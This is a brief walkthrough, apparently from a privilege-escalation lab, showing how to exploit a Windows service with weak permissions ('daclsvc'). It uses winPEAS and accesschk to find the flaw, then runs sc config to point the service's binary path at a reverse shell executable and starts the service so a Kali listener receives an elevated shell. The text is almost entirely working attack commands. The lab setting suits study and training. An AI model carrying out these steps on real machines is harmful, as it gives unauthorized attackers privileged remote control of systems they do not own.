1.Run winPEAS to check for service misconfigurations:

```
winPEASany.exe quiet servicesinfo
```


2.Note that we can modify the “daclsvc” service.

3.We can confirm this with accesschk.exe:
```
accesschk.exe /accepteula -uwcqv user daclsvc
```

4.Check the current configuration of the service:
```
sc qc daclsvc
```

5.Check the current status of the service:

```
sc query daclsvc
```

6.Reconfigure the service to use our reverse shell executable:
```
sc config daclsvc binpath= "C:\PrivEsc\reverse.exe"
```

7.Start a listener on Kali, and then start the service to trigger the exploit:

```
net start daclsvc
```

we can also start the service using

```
sc start daclsvc
```
